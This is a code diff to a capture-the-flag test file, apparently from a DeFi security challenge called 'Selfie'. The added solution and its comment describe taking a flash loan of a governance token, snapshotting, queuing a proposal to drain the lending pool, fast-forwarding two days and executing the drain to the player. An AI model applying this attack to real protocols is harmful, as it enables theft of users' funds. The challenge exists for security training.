@@ -37,9 +37,27 @@ describe('[Challenge] Selfie', function () {
 
     });
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+    // Exploit relies on the fact that the governance voting is token based and the flash loan allows taking out flash loans with the governance token. So we take out a large flash loan, take a new token snapshot, request a new governance proposal to permanently drain all the funds from the pool contract (only callable by the governance contract), wait 2 days for the governance grace period. Then execute the governance action
+    it("Execution", async function () {
+      const ExploitContractFactory = await ethers.getContractFactory(
+        "SelfieExploit",
+        deployer
+      );
+
+      const exploitContract = await ExploitContractFactory.deploy(
+        pool.address,
+        governance.address,
+        token.address
+      );
+
+      await exploitContract.queueActionExploit();
+
+      // Fast forward 2 days for the governance grace period
+      await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+
+      await exploitContract.executeActionExploit(player.address);
     });
+
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
